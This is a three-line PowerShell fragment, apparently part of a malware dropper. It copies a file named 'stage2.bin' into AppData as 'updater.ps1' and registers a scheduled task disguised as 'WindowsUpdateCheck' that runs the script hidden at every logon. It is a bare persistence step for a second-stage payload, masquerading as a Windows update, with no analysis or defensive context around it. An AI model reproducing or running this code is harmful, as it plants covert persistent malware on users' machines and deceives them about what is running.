
Copy-Item -Path "$env:TEMP\stage2.bin" -Destination "$env:APPDATA\updater.ps1" -Force
schtasks.exe /Create /TN 'WindowsUpdateCheck' /TR "powershell.exe -NoP -File `"$env:APPDATA\updater.ps1`"" /SC ONLOGON /F
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
